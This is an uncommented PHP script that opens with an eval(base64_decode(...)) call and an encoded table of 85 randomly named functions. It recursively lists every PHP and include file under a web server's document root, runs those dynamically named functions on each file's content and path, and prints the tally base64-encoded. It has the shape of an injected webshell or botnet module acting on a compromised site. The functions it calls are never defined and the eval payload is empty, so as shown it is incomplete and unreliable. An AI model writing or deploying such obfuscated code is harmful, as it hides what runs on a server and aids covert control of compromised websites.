eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo4NTp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo3OiJya2Zld3dhIjtpOjI7czo0OiJnYXpnIjt9aToxO2E6Mzp7aTowO2k6NTtpOjE7czo5OiJydXJteXZ3YXUiO2k6MjtzOjY6ImdueGNyeiI7fWk6MjthOjM6e2k6MDtpOjE1O2k6MTtzOjEwOiJybmpjbWZteGhmIjtpOjI7czo5OiJndXZxaGRjaHIiO31pOjM7YTozOntpOjA7aToxODtpOjE7czo1OiJybXBxdiI7aToyO3M6NjoiZ2xuamV5Ijt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6Nzoicm5tcHBqdyI7aToyO3M6NDoiZ3NxdSI7fWk6NTthOjM6e2k6MDtpOjM2O2k6MTtzOjk6InJuYXdzZGJvayI7aToyO3M6NToiZ3p0aWgiO31pOjY7YTozOntpOjA7aTo0MjtpOjE7czo2OiJyamNwd2siO2k6MjtzOjY6Imd5cHlweiI7fWk6NzthOjM6e2k6MDtpOjU0O2k6MTtzOjk6InJtb3Z3bHJ5cSI7aToyO3M6NzoiZ3d2ZGdjbSI7fWk6ODthOjM6e2k6MDtpOjYwO2k6MTtzOjY6InJ4ZGp0bCI7aToyO3M6NjoiZ2NsanhwIjt9aTo5O2E6Mzp7aTowO2k6ODk7aToxO3M6NjoicmNub2xqIjtpOjI7czo3OiJnYXZlZXZkIjt9aToxMDthOjM6e2k6MDtpOjEwOTtpOjE7czo1OiJyY3prZSI7aToyO3M6OToiZ295d3R0c2xvIjt9aToxMTthOjM6e2k6MDtpOjExMDtpOjE7czoxMToicmtpdHl6a2V0bnUiO2k6MjtzOjg6Imdhc2ltbnpyIjt9aToxMjthOjM6e2k6MDtpOjExMTtpOjE7czo4OiJydmhqamJuZSI7aToyO3M6MTE6ImdmdHVod3drc2RxIjt9aToxMzthOjM6e2k6MDtpOjExMjtpOjE7czo0OiJyaWh2IjtpOjI7czo1OiJnYnBscCI7fWk6MTQ7YTozOntpOjA7aToxMTU7aToxO3M6ODoicmR2aG9nZWwiO2k6MjtzOjU6ImdzcXh1Ijt9aToxNTthOjM6e2k6MDtpOjExODtpOjE7czo2OiJydm9raW8iO2k6MjtzOjg6ImdsZXRybGFhIjt9aToxNjthOjM6e2k6MDtpOjEyNjtpOjE7czo2OiJyaWpucWwiO2k6MjtzOjEwOiJneWVvbWFpYmRyIjt9aToxNzthOjM6e2k6MDtpOjEyNztpOjE7czoxMToicm53d2Fna2xnZW4iO2k6MjtzOjk6Imd2ZXN1YXpocSI7fWk6MTg7YTozOntpOjA7aToxMzA7aToxO3M6ODoicndpcmhhZnUiO2k6MjtzOjc6ImdvdnB2aGwiO31pOjE5O2E6Mzp7aTowO2k6MTM0O2k6MTtzOjEwOiJyaHZlcHd4dGR6IjtpOjI7czo1OiJnaGVnaiI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6MTA6InJ2cG1hZWFxb3IiO2k6MjtzOjU6Imdlb3JrIjt9aToyMTthOjM6e2k6MDtpOjE0ODtpOjE7czoxMToicnJ4b3JkdnVjdGoiO2k6MjtzOjQ6ImdkZWoiO31pOjIyO2E6Mzp7aTowO2k6MTU3O2k6MTtzOjg6InJ1ZGFmc29sIjtpOjI7czo0OiJncGlzIjt9aToyMzthOjM6e2k6MDtpOjE2MztpOjE7czo1OiJydnRnayI7aToyO3M6NjoiZ3Z1ZXh1Ijt9aToyNDthOjM6e2k6MDtpOjE3MjtpOjE7czoxMToicmx1cGFhdmJzbXciO2k6MjtzOjk6Imd0b2ZjdWFwaiI7fWk6MjU7YTozOntpOjA7aToxNzQ7aToxO3M6MTA6InJqdXp2em9nengiO2k6MjtzOjQ6Imd0ZWYiO31pOjI2O2E6Mzp7aTowO2k6MTc5O2k6MTtzOjk6InJ4c25jY3dxYSI7aToyO3M6MTA6ImdkdXd1Z3dxbWUiO31pOjI3O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjg6InJkd2NvcnhvIjtpOjI7czo5OiJnd25oYmxobHkiO31pOjI4O2E6Mzp7aTowO2k6MTg5O2k6MTtzOjQ6InJ5a2wiO2k6MjtzOjY6Imd3dWl2dCI7fWk6Mjk7YTozOntpOjA7aToxOTI7aToxO3M6NjoicnB0eGtsIjtpOjI7czoxMToiZ3hweXN0bWJndmYiO31pOjMwO2E6Mzp7aTowO2k6MTk2O2k6MTtzOjQ6InJyaWMiO2k6MjtzOjQ6ImdicW0iO31pOjMxO2E6Mzp7aTowO2k6MTk4O2k6MTtzOjc6InJ5d2VzamsiO2k6MjtzOjEwOiJnb29ibXVyd2x0Ijt9aTozMjthOjM6e2k6MDtpOjE5OTtpOjE7czo1OiJyZ2p0cyI7aToyO3M6MTA6ImdkZXBoamF2ZXIiO31pOjMzO2E6Mzp7aTowO2k6MjAwO2k6MTtzOjExOiJyYnNxcWp2enN0aCI7aToyO3M6NDoiZ2N3dCI7fWk6MzQ7YTozOntpOjA7aToyMDE7aToxO3M6OToicm91bGJ1YmZiIjtpOjI7czo2OiJnamh1YnkiO31pOjM1O2E6Mzp7aTowO2k6MjAzO2k6MTtzOjc6InJtZWZubXEiO2k6MjtzOjQ6Imd4bmIiO31pOjM2O2E6Mzp7aTowO2k6MjA2O2k6MTtzOjc6InJ2ZXRsenQiO2k6MjtzOjc6Imdrb2dyZHoiO31pOjM3O2E6Mzp7aTowO2k6MjA5O2k6MTtzOjEwOiJyc2d1b3dpa3V6IjtpOjI7czo3OiJneXl0d2twIjt9aTozODthOjM6e2k6MDtpOjIxMDtpOjE7czo3OiJyeGF1YmtzIjtpOjI7czo5OiJnb2FjcXBtaGgiO31pOjM5O2E6Mzp7aTowO2k6MjEyO2k6MTtzOjg6InJ5dnpvZHRvIjtpOjI7czo1OiJnbnpicSI7fWk6NDA7YTozOntpOjA7aToyMTM7aToxO3M6ODoicnRic3R2eHoiO2k6MjtzOjExOiJnZnV5b2R4cHdpeCI7fWk6NDE7YTozOntpOjA7aToyMTQ7aToxO3M6ODoicmx3b3B6c3ciO2k6MjtzOjk6Imdqa2Juenp4ZSI7fWk6NDI7YTozOntpOjA7aToyMTU7aToxO3M6NDoicmRmbiI7aToyO3M6MTA6ImdxY2hmeWZkY3AiO31pOjQzO2E6Mzp7aTowO2k6MjE2O2k6MTtzOjU6InJ4cGZiIjtpOjI7czoxMDoiZ2xrbWt4eHBkYiI7fWk6NDQ7YTozOntpOjA7aToyMTc7aToxO3M6OToicmRyY3dncWJ1IjtpOjI7czo0OiJnY2p5Ijt9aTo0NTthOjM6e2k6MDtpOjIxODtpOjE7czoxMDoicnJzYnVjZHFlbCI7aToyO3M6NjoiZ2xwamR2Ijt9aTo0NjthOjM6e2k6MDtpOjIyMTtpOjE7czoxMToicm1mZWF4ZXJteWciO2k6MjtzOjExOiJna3BqZ3FkaHRweSI7fWk6NDc7YTozOntpOjA7aToyMjI7aToxO3M6MTA6InJveGxra2drYnMiO2k6MjtzOjEwOiJnZWhwbWludmdvIjt9aTo0ODthOjM6e2k6MDtpOjIyMztpOjE7czo5OiJybmtoYWliZ3MiO2k6MjtzOjk6Imd0Y3F1Z3FlaCI7fWk6NDk7YTozOntpOjA7aToyMjQ7aToxO3M6NToicmhmangiO2k6MjtzOjc6ImdpZ2txZHYiO31pOjUwO2E6Mzp7aTowO2k6MjI1O2k6MTtzOjU6InJkZnlmIjtpOjI7czo1OiJneHlieSI7fWk6NTE7YTozOntpOjA7aToyMzA7aToxO3M6NToicml3cnMiO2k6MjtzOjc6Imd0cWV2dXEiO31pOjUyO2E6Mzp7aTowO2k6MjMyO2k6MTtzOjY6InJybXJucyI7aToyO3M6NToiZ3NvYmsiO31pOjUzO2E6Mzp7aTowO2k6MjM1O2k6MTtzOjg6InJ1bm9pcGZhIjtpOjI7czo0OiJneXBjIjt9aTo1NDthOjM6e2k6MDtpOjIzNjtpOjE7czo0OiJybWx4IjtpOjI7czo4OiJna21penNzYSI7fWk6NTU7YTozOntpOjA7aToyMzc7aToxO3M6ODoicnVqcWlleWciO2k6MjtzOjc6ImdseGtoZmgiO31pOjU2O2E6Mzp7aTowO2k6MjM4O2k6MTtzOjQ6InJtanEiO2k6MjtzOjk6Imd4bmxtdGFnayI7fWk6NTc7YTozOntpOjA7aToyMzk7aToxO3M6MTE6InJjdnp2enBpZm1xIjtpOjI7czo0OiJndG92Ijt9aTo1ODthOjM6e2k6MDtpOjI0MDtpOjE7czoxMToicmpwY214Zmthc3AiO2k6MjtzOjg6ImdwdHl1a3drIjt9aTo1OTthOjM6e2k6MDtpOjI0MTtpOjE7czoxMToicmJ3bm96YXp1YXoiO2k6MjtzOjExOiJnaXhob2t2eWdtdyI7fWk6NjA7YTozOntpOjA7aToyNDI7aToxO3M6NToicnNrem0iO2k6MjtzOjExOiJnamN6bG5ieG5mYSI7fWk6NjE7YTozOntpOjA7aToyNDM7aToxO3M6NToicnB1aWUiO2k6MjtzOjU6ImdldmVkIjt9aTo2MjthOjM6e2k6MDtpOjI0NDtpOjE7czo3OiJyb3lsZnJ4IjtpOjI7czo4OiJnYXJ3b255ZSI7fWk6NjM7YTozOntpOjA7aToyNDU7aToxO3M6NjoicnBudWJlIjtpOjI7czoxMDoiZ2NycXJmd3lvZiI7fWk6NjQ7YTozOntpOjA7aToyNDY7aToxO3M6NjoicnVoZXFjIjtpOjI7czo5OiJnYWZydnpkdGUiO31pOjY1O2E6Mzp7aTowO2k6MjQ3O2k6MTtzOjg6InJhaWdib2ZqIjtpOjI7czo3OiJneHBuZ3ZqIjt9aTo2NjthOjM6e2k6MDtpOjI0ODtpOjE7czo2OiJyem9wYngiO2k6MjtzOjk6Imd6b3BzZnRzdyI7fWk6Njc7YTozOntpOjA7aToyNDk7aToxO3M6NjoicndycGRtIjtpOjI7czo1OiJnd3VxZCI7fWk6Njg7YTozOntpOjA7aToyNTA7aToxO3M6OToicnh2aGh4dWl6IjtpOjI7czo3OiJneWRrcGNlIjt9aTo2OTthOjM6e2k6MDtpOjI1MTtpOjE7czo0OiJyc3p0IjtpOjI7czo0OiJnY3ZsIjt9aTo3MDthOjM6e2k6MDtpOjI1MjtpOjE7czo4OiJydm9veHpjdSI7aToyO3M6MTA6ImdldGhvd3VndWIiO31pOjcxO2E6Mzp7aTowO2k6MjUzO2k6MTtzOjEwOiJya2J0Y3d3cmV1IjtpOjI7czoxMDoiZ2tkbmNveHBhcyI7fWk6NzI7YTozOntpOjA7aToyNTQ7aToxO3M6OToicmhncW11Znh3IjtpOjI7czo4OiJnZXN3bWd4YSI7fWk6NzM7YTozOntpOjA7aToyNTU7aToxO3M6NjoicnFpaWhxIjtpOjI7czo3OiJnamlvdnFiIjt9aTo3NDthOjM6e2k6MDtpOjI1NjtpOjE7czo1OiJybG1mayI7aToyO3M6NDoiZ3ZxbiI7fWk6NzU7YTozOntpOjA7aToyNTc7aToxO3M6NToicmZkbmwiO2k6MjtzOjk6Imdpcmx1ZWlrcyI7fWk6NzY7YTozOntpOjA7aToyNTg7aToxO3M6NjoicnllbWlsIjtpOjI7czo0OiJncGhsIjt9aTo3NzthOjM6e2k6MDtpOjI1OTtpOjE7czo2OiJyaGFpa3giO2k6MjtzOjc6ImdxZWpucGsiO31pOjc4O2E6Mzp7aTowO2k6MjYwO2k6MTtzOjExOiJycXhxcmpkcHB1dSI7aToyO3M6NzoiZ2RnZHRvaiI7fWk6Nzk7YTozOntpOjA7aToyNjE7aToxO3M6MTE6InJibm1pc3V3d29vIjtpOjI7czo0OiJna3h4Ijt9aTo4MDthOjM6e2k6MDtpOjI2MjtpOjE7czoxMDoicmFrYXF0aG5vbSI7aToyO3M6NzoiZ2xkdnN5aiI7fWk6ODE7YTozOntpOjA7aToyNjM7aToxO3M6Njoicm9hbnhhIjtpOjI7czo5OiJnaXBzYWhud3AiO31pOjgyO2E6Mzp7aTowO2k6MjY0O2k6MTtzOjExOiJyb3Jua2h6dWhiZCI7aToyO3M6MTA6ImdrdHllZ2J3b3ciO31pOjgzO2E6Mzp7aTowO2k6MjY1O2k6MTtzOjU6InJ4Z2NmIjtpOjI7czo2OiJneXNraWwiO31pOjg0O2E6Mzp7aTowO2k6MjY2O2k6MTtzOjU6InJud212IjtpOjI7czoxMDoiZ2J2bW9ybGNldSI7fX0="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();